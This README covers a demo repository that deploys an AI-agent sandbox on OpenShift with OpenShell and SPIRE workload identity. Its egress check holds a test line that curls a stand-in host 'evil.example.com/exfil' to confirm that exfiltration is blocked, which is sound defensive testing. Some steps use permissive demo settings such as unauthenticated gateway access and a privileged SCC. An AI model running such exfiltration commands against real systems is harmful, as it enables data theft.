# Secure Agent Sandbox Demo

**"An analyst agent that RUNS CODE, safely"** — on OpenShift with RHOAI, OpenShell, and Zero Trust Workload Identity.

## Architecture

```
┌──────────────────────────────────────────────────────────────────────┐
│  OpenShift 4.22 Cluster                                              │
│                                                                      │
│  ns: agent-sandbox-demo              ns: openshell                   │
│  ┌────────────────────┐              ┌────────────────────────────┐  │
│  │                    │              │  OpenShell Gateway         │  │
│  │  Chat UI (FastAPI) │──gRPC/mTLS──▶│  (control plane)           │  │
│  │  + OAuth Proxy     │              │                            │  │
│  │                    │              │  Route: passthrough TLS    │  │
│  └────────────────────┘              └────────────┬───────────────┘  │
│                                                   │                  │
│  ┌────────────────────┐                           │ creates via      │
│  │  identity-demo pod │              ┌────────────▼───────────────┐  │
│  │  + SPIFFE CSI vol  │              │  Sandbox Pod               │  │
│  │  (ZTWIM / SPIRE)   │              │  ┌──────────────────────┐  │  │
│  └────────────────────┘              │  │ Supervisor (PID 1)   │  │  │
│                                      │  │  Landlock + seccomp   │  │  │
│  ns: openshift-operators             │  │  ┌────────────────┐  │  │  │
│  ┌────────────────────┐              │  │  │ Proxy (L7)     │  │  │  │
│  │  SPIRE Server      │              │  │  │ ALLOW / DENY   │  │  │  │
│  │  SPIRE Agents (x3) │              │  │  └───┬────────┬───┘  │  │  │
│  │  SPIFFE CSI Driver │              │  │      │        │      │  │  │
│  │  ZTWIM 1.1.1       │              │  │   ✅ MaaS   ❌ evil │  │  │
│  └────────────────────┘              │  └──────────────────────┘  │  │
│                                      │  Owner: Sandbox CRD        │  │
│  Agent Sandbox Operator 0.9.0        │  (agents.x-k8s.io)        │  │
│  (manages pod lifecycle)             └────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

## Components

| Component | Version | Role |
|---|---|---|
| OpenShift | 4.22.8 | Platform |
| RHOAI | 3.5.0 | AI platform (OGX, MaaS) |
| OpenShell (NVIDIA) | 0.0.117-dev | Sandbox gateway + policy engine |
| Agent Sandbox Operator (Red Hat) | 0.9.0 (Tech Preview) | Pod lifecycle via CRDs (`agents.x-k8s.io`) |
| ZTWIM | 1.1.1 (GA) | SPIFFE/SPIRE workload identity |
| OAuth Proxy | v4.16 | OpenShift SSO for the Chat UI |

### What does what

- **Agent Sandbox Operator** manages pod lifecycle: create, delete, warm pools. No opinion on security.
- **OpenShell Gateway** is the control plane: sandbox state, policy, credentials, audit, relay.
- **OpenShell Supervisor** runs inside each sandbox pod (PID 1): applies Landlock filesystem restrictions, seccomp syscall filters, starts the network proxy, launches the agent process as unprivileged user.
- **OpenShell Proxy** intercepts all outbound traffic in the sandbox network namespace: inspects L4 (host:port + calling binary) and L7 (HTTP method + path), enforces ALLOW/DENY per policy, logs every decision in OCSF format.

The supervisor and proxy are **not sidecars** — they run in the same container as the agent. The supervisor binary is sideloaded via a Kubernetes `image` volume.

## Prerequisites

- OpenShift 4.19+ cluster with admin access
- `oc` CLI authenticated
- `openshell` CLI (`curl -LsSf https://raw.githubusercontent.com/NVIDIA/OpenShell/main/install.sh | sh`)
- `helm` v3.17+
- `podman` for container builds
- A MaaS LLM endpoint (URL + API key)
- A quay.io account for the Chat UI image

## Deployment Steps

### Step 1: Create the demo namespace

```bash
oc new-project agent-sandbox-demo
```

### Step 2: Install Zero Trust Workload Identity Manager (ZTWIM)

```bash
# Install the operator from OperatorHub
oc apply -f identity/ztwim-setup.yaml

# Wait for SPIRE components (server, agents, CSI driver, OIDC provider)
oc get pods -n openshift-operators | grep spire

# Create ClusterSPIFFEID for the demo namespace
oc apply -f identity/clusterspiffeid.yaml

# Deploy the identity-demo pod with SPIFFE CSI volume
oc apply -f identity/identity-demo.yaml
```

### Step 3: Install Agent Sandbox Operator

```bash
cat <<'EOF' | oc apply -f -
apiVersion: operators.coreos.com/v1alpha1
kind: Subscription
metadata:
  name: agent-sandbox-operator
  namespace: openshift-operators
spec:
  channel: preview-0.9
  installPlanApproval: Automatic
  name: agent-sandbox-operator
  source: redhat-operators
  sourceNamespace: openshift-marketplace
EOF

# Wait for the operator
oc get csv -n openshift-operators | grep agent-sandbox
```

### Step 4: Install OpenShell Gateway via Helm

```bash
# Create namespace
oc create ns openshell

# Install with OpenShift-specific settings
helm install openshell oci://ghcr.io/nvidia/openshell/helm-chart --version 0.0.0-dev \
  -n openshell \
  --set podSecurityContext.fsGroup=null \
  --set securityContext.runAsUser=null \
  --set server.disableTls=false \
  --set server.auth.allowUnauthenticatedUsers=true \
  --set openshiftRoute.enabled=true \
  --set openshiftRoute.host=openshell.apps.<cluster-domain> \
  --set 'pkiInitJob.serverDnsNames={openshell.apps.<cluster-domain>}'

# Grant privileged SCC to the sandbox service account
oc adm policy add-scc-to-user privileged system:serviceaccount:openshell:openshell-sandbox

# Grant sandbox CRD management to the gateway SA
cat <<'EOF' | oc apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: openshell-sandbox-manager
rules:
- apiGroups: ["agents.x-k8s.io"]
  resources: ["sandboxes"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
- apiGroups: ["extensions.agents.x-k8s.io"]
  resources: ["sandboxclaims", "sandboxtemplates", "sandboxwarmpools"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: openshell-sandbox-manager
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: openshell-sandbox-manager
subjects:
- kind: ServiceAccount
  name: openshell
  namespace: openshell
EOF
```

### Step 5: Register the gateway with the CLI

```bash
# Extract client TLS certs
mkdir -p ~/.config/openshell/gateways/cluster/mtls
oc get secret openshell-client-tls -n openshell -o jsonpath='{.data.ca\.crt}' | base64 -d > ~/.config/openshell/gateways/cluster/mtls/ca.crt
oc get secret openshell-client-tls -n openshell -o jsonpath='{.data.tls\.crt}' | base64 -d > ~/.config/openshell/gateways/cluster/mtls/tls.crt
oc get secret openshell-client-tls -n openshell -o jsonpath='{.data.tls\.key}' | base64 -d > ~/.config/openshell/gateways/cluster/mtls/tls.key

# Register
openshell gateway add https://openshell.apps.<cluster-domain> --local --name cluster --gateway-insecure

# Verify
openshell status
```

### Step 6: Build and deploy the Chat UI

```bash
# Build the image
podman build --platform linux/amd64 \
  -t quay.io/<your-account>/secure-agent-sandbox-chat:latest \
  -f chat/Containerfile chat/

# Push
podman push quay.io/<your-account>/secure-agent-sandbox-chat:latest

# Create MaaS credentials secret
oc create secret generic maas-credentials -n agent-sandbox-demo \
  --from-literal=url='<maas-chat-completions-url>' \
  --from-literal=api_key='<maas-api-key>' \
  --from-literal=model='<model-name>'

# Create OAuth proxy session secret
oc create secret generic chat-ui-proxy -n agent-sandbox-demo \
  --from-literal=session_secret="$(openssl rand -base64 32)"

# Copy OpenShell client TLS certs to the demo namespace
oc get secret openshell-client-tls -n openshell -o json | \
  python3 -c "import json,sys; s=json.load(sys.stdin); s['metadata']={'name':'openshell-client-tls','namespace':'agent-sandbox-demo'}; json.dump(s,sys.stdout)" | \
  oc apply -f -

# Update chat/deploy.yaml with your image name, then deploy
oc apply -f chat/deploy.yaml -n agent-sandbox-demo
```

The Chat UI will be available at: `https://chat-ui-agent-sandbox-demo.apps.<cluster-domain>`

## Verification Checklist

Run these checks after deployment to confirm everything works before the demo.

### 1. ZTWIM / SPIRE running

```bash
# All SPIRE components must be Running
oc get pods -n openshift-operators | grep spire
```

Expected: `spire-server-0` (2/2), `spire-agent-*` (1/1 x3), `spire-spiffe-csi-driver-*` (2/2 x3).

```bash
# ZTWIM manager must be Ready
oc get zerotrustworkloadidentitymanager cluster -o jsonpath='{.status.conditions[?(@.type=="Ready")].status}'
```

Expected: `True` (SpireOIDCDiscoveryProvider may lag — not blocking for X.509 demo).

### 2. Identity-demo pod receives a SVID

```bash
oc exec -n agent-sandbox-demo identity-demo -- bash -c \
  'cd /tmp && [ -f spire-agent ] || (curl -sSL https://github.com/spiffe/spire/releases/download/v1.15.2/spire-1.15.2-linux-amd64-musl.tar.gz | tar xzf - --strip-components=2 spire-1.15.2/bin/spire-agent) && mkdir -p svid && ./spire-agent api fetch x509 -socketPath /spiffe-workload-api/spire-agent.sock -write /tmp/svid/ && openssl x509 -in /tmp/svid/svid.0.pem -noout -subject -serial -dates -ext subjectAltName'
```

Expected output contains:
```
SPIFFE ID:  spiffe://<trust-domain>/ns/agent-sandbox-demo/sa/default
X509v3 Subject Alternative Name:
    URI:spiffe://<trust-domain>/ns/agent-sandbox-demo/sa/default
```

### 3. OpenShell gateway connected

```bash
openshell status
```

Expected:
```
Status:          Connected
Authentication:  Authenticated (mTLS transport)
```

### 4. Agent Sandbox Operator running

```bash
oc get csv -n openshift-operators | grep agent-sandbox
```

Expected: `agent-sandbox-operator.v0.9.0 ... Succeeded`

### 5. Sandbox creation and exec

```bash
# Create a test sandbox
openshell sandbox create --name test-check --detach

# Wait and verify
openshell sandbox list

# Exec into it
openshell sandbox exec -n test-check -- echo "sandbox works"

# Clean up
openshell sandbox delete test-check
```

Expected: `sandbox works` printed, sandbox reaches `Ready` phase.

### 6. MaaS reachable from sandbox (with policy)

```bash
# Create sandbox
openshell sandbox create --name test-maas --detach

# Apply MaaS policy
openshell policy set test-maas --policy policies/analyst.yaml --wait

# Test LLM call from inside the sandbox
openshell sandbox exec -n test-maas \
  --env MAAS_URL=<maas-url> \
  --env MAAS_API_KEY=<maas-key> \
  -- python3 -c "
import urllib.request, json, os
payload = json.dumps({'model':'<model>','messages':[{'role':'user','content':'say hi'}],'max_tokens':5}).encode()
req = urllib.request.Request(os.environ['MAAS_URL'], data=payload, headers={'Content-Type':'application/json','Authorization':'Bearer '+os.environ['MAAS_API_KEY']}, method='POST')
print(json.loads(urllib.request.urlopen(req,timeout=15).read())['choices'][0]['message']['content'][:100])
"

# Clean up
openshell sandbox delete test-maas
```

Expected: LLM responds with text.

### 7. Exfiltration blocked (without policy)

```bash
openshell sandbox create --name test-exfil --detach
openshell sandbox exec -n test-exfil -- curl -sf --max-time 5 https://evil.example.com/exfil; echo "exit: $?"
openshell sandbox delete test-exfil
```

Expected: connection denied, non-zero exit code.

### 8. Chat UI accessible

```bash
curl -sk https://chat-ui-agent-sandbox-demo.apps.<cluster-domain> | head -1
```

Expected: `<!DOCTYPE html>` (after OAuth redirect, open in browser to test).

### 9. Audit logs visible

```bash
openshell sandbox create --name test-logs --detach
openshell sandbox exec -n test-logs -- curl -sf https://example.com > /dev/null 2>&1; true
openshell logs test-logs --source sandbox | grep "DENIED"
openshell sandbox delete test-logs
```

Expected: `NET:OPEN [MED] DENIED` line with `example.com:443`.

---

## Running the Demo

### Preparation (before the demo)

```bash
# Create a sandbox for the demo user (detached = stays alive)
openshell sandbox create --name analyst-mouachan --label owner=mouachan --detach

# Verify it's Ready
openshell sandbox list
```

### Module 1: Zero Trust Workload Identity (4 min)

**Narration**: *"Every workload on this cluster gets a cryptographic identity — not from a secret someone distributed, but from what the pod IS."*

```bash
# Show the identity-demo pod
oc get pod identity-demo -n agent-sandbox-demo

# Fetch the SVID
oc exec -n agent-sandbox-demo identity-demo -- bash -c \
  'cd /tmp && [ -f spire-agent ] || (curl -sSL https://github.com/spiffe/spire/releases/download/v1.15.2/spire-1.15.2-linux-amd64-musl.tar.gz | tar xzf - --strip-components=2 spire-1.15.2/bin/spire-agent) && mkdir -p svid && ./spire-agent api fetch x509 -socketPath /spiffe-workload-api/spire-agent.sock -write /tmp/svid/ && openssl x509 -in /tmp/svid/svid.0.pem -noout -subject -serial -dates -ext subjectAltName'
```

**Money shot**: `URI:spiffe://<cluster-domain>/ns/agent-sandbox-demo/sa/default`

```bash
# Delete and recreate → identity re-issued automatically
oc delete pod identity-demo -n agent-sandbox-demo --wait
oc apply -f identity/identity-demo.yaml
sleep 15
# Fetch again → new serial
oc exec -n agent-sandbox-demo identity-demo -- bash -c \
  'cd /tmp && [ -f spire-agent ] || (curl -sSL https://github.com/spiffe/spire/releases/download/v1.15.2/spire-1.15.2-linux-amd64-musl.tar.gz | tar xzf - --strip-components=2 spire-1.15.2/bin/spire-agent) && mkdir -p svid && ./spire-agent api fetch x509 -socketPath /spiffe-workload-api/spire-agent.sock -write /tmp/svid/ && openssl x509 -in /tmp/svid/svid.0.pem -noout -serial -dates -ext subjectAltName'
```

**Money shot**: New serial number. *"22,000 workloads, zero credentials distributed."*

### Module 2: Secure Agent Sandbox (5 min)

**Narration**: *"Now let's run an AI agent that executes code — safely."*

**Terminal 1** — start the audit log stream:
```bash
openshell logs analyst-mouachan --tail --source sandbox | grep "ALLOWED\|DENIED"
```

**Terminal 2** — show the sandbox:
```bash
# List sandboxes
openshell sandbox list

# Show the sandbox pod on OpenShift
oc get sandboxes -n openshell

# Show the policy (default — no MaaS access)
openshell policy get analyst-mouachan --full -o json
```

**Browser** — open the Chat UI:
1. Navigate to `https://chat-ui-agent-sandbox-demo.apps.<cluster-domain>`
2. Log in via OpenShift OAuth
3. Click **Ask** → `BLOCKED — sandbox network policy denied access to MaaS`
4. Terminal 1 shows: `DENIED python3.14 → maas.apps...:443`

**Terminal 2** — apply the MaaS policy:
```bash
openshell policy set analyst-mouachan --policy policies/analyst.yaml --wait
```

**Browser**:
5. Click **Ask** again → `ALLOWED — code generated by LLM and executed inside sandbox`
6. Terminal 1 shows: `ALLOWED python3.14 → maas.apps...:443`
7. Click **Try Exfiltration** → `BLOCKED — outbound connection denied by sandbox policy`
8. Terminal 1 shows: `DENIED python3.14 → evil.example.com:443`

**Narration**: *"The agent wrote and ran code. The policy decided what it could reach. Every decision is audited."*

### Module 3: Cleanup

```bash
openshell sandbox delete analyst-mouachan
```

## OpenShell Workspace Modes

OpenShell supports three namespace strategies for sandbox placement:

| Mode | Behavior | Use case |
|---|---|---|
| **shared** (default) | All sandboxes in the gateway namespace | Dev, single-team |
| **managed** | Auto-creates a namespace per workspace | Multi-tenant SaaS |
| **operator** | Pre-provisioned namespaces discovered by label | Production, regulated |

This demo uses **shared mode** — sandbox pods run in the `openshell` namespace alongside the gateway.

## Sandbox Pod Structure

Verified from the actual pod on the cluster:

| Element | Detail |
|---|---|
| Owner | `agents.x-k8s.io/v1beta1 Sandbox` — managed by Agent Sandbox Operator |
| Init container | `workspace-init` — prepares the workspace |
| Container | `agent` — single container running the sandbox base image |
| PID 1 | `openshell-sandbox` (supervisor) — sideloaded via image volume |
| Volume `openshell-supervisor-bin` | type `image` — supervisor binary from OCI image |
| Volume `openshell-client-tls` | secret — mTLS certs for gateway communication |
| Volume `openshell-sa-token` | projected — SA token for `IssueSandboxToken` bootstrap |
| Volume `workspace` | PVC — persistent workspace storage |

The supervisor boots as PID 1, bootstraps (SA token → JWT exchange with gateway), fetches the policy, applies Landlock + seccomp + network namespace, starts the proxy, then launches the agent process as an unprivileged `sandbox` user.

## Policy Format

OpenShell policies are declarative YAML. Example (`policies/analyst.yaml`):

```yaml
version: 1

filesystem_policy:
  include_workdir: true
  read_only: [/usr, /lib, /proc, /dev/urandom, /app, /etc, /var/log]
  read_write: [/sandbox, /tmp, /dev/null]

landlock:
  compatibility: best_effort

process:
  run_as_user: sandbox
  run_as_group: sandbox

network_policies:
  maas_inference:
    name: maas-inference
    endpoints:
      - host: <maas-hostname>
        port: 443
        protocol: rest
        enforcement: enforce
        access: full
    binaries:
      - { path: "/sandbox/.uv/python/**" }
      - { path: /usr/bin/python3 }
```

Key rules:
- `filesystem_policy` and `landlock` are **static** — locked at sandbox creation, require destroy/recreate to change
- `network_policies` are **dynamic** — hot-reloadable via `openshell policy set` without restarting the sandbox
- `enforcement: enforce` blocks violations; `enforcement: audit` logs without blocking (useful for policy development)

## Honest Boundaries

- Today the gateways authenticate by token; SVID-based validation at the gateways is the roadmap step
- We show the identity layer working, not pretend the whole chain is wired end-to-end
- OpenShell integration with RHOAI is planned; today we use upstream OpenShell with the Kubernetes driver
- Sandbox pods run in the `openshell` namespace (shared mode); operator mode with per-namespace isolation requires additional TLS configuration for cross-namespace supervisor bootstrap

## Repository Layout

```
secure-agent-sandbox-demo/
├── agent/
│   ├── analyst.py              # Analyst agent: question → LLM → code → exec
│   ├── data/sales.csv          # Sample dataset (18 rows, 5 columns)
│   └── exfil_test.sh           # Exfiltration test script
├── chat/
│   ├── app.py                  # FastAPI + OpenShell SDK + OAuth headers
│   ├── Containerfile           # UBI9 Python container image
│   ├── deploy.yaml             # Deployment + OAuth proxy + Service + Route
│   └── requirements.txt        # Python dependencies
├── identity/
│   ├── ztwim-setup.yaml        # ZTWIM operator subscription + SPIRE CRs
│   ├── clusterspiffeid.yaml    # ClusterSPIFFEID for demo namespace
│   ├── identity-demo.yaml      # Pod with SPIFFE CSI volume
│   └── fetch-svid.sh           # Helper to fetch and display SVID
├── policies/
│   └── analyst.yaml            # OpenShell policy: allow MaaS, deny everything else
├── slides/
│   └── demo-flow.png           # Architecture diagram for slides
├── DEMO.md                     # Quick-reference demo script
├── record.sh                   # Asciinema recording per module
└── README.md                   # This file
```

## Useful Commands

```bash
# Sandbox management
openshell sandbox list
openshell sandbox create --name analyst-<user> --label owner=<user> --detach
openshell sandbox delete analyst-<user>
openshell sandbox exec -n analyst-<user> -- <command>

# Policy management
openshell policy get analyst-<user> --full -o json
openshell policy set analyst-<user> --policy policies/analyst.yaml --wait
openshell policy list analyst-<user>

# Audit logs
openshell logs analyst-<user> --tail --source sandbox
openshell logs analyst-<user> --tail --source sandbox | grep "ALLOWED\|DENIED"

# SVID fetch
oc exec -n agent-sandbox-demo identity-demo -- bash -c \
  '/tmp/spire-agent api fetch x509 -socketPath /spiffe-workload-api/spire-agent.sock'

# OpenShift resources
oc get sandboxes -n openshell
oc get pods -n openshell
oc get zerotrustworkloadidentitymanager cluster
```

## References

- [NVIDIA OpenShell](https://github.com/NVIDIA/openshell)
- [OpenShell Docs](https://docs.nvidia.com/openshell/)
- [OpenShell Policy Schema](https://docs.nvidia.com/openshell/reference/policy-schema)
- [Red Hat build of Agent Sandbox](https://developers.redhat.com/articles/2026/07/15/red-hat-build-agent-sandbox-isolated-workload-management-kubernetes)
- [Layered sandboxing: OpenShift + OpenShell](https://developers.redhat.com/articles/2026/07/16/layered-sandboxing-ai-agents-openshift-and-openshell)
- [ZTWIM v1.1 GA](https://www.redhat.com/en/blog/zero-trust-workload-identity-manager-11-generally-available-red-hat-openshift)
- [ZTWIM Docs (OCP 4.21)](https://docs.redhat.com/en/documentation/openshift_container_platform/4.21/html/security_and_compliance/zero-trust-workload-identity-manager)
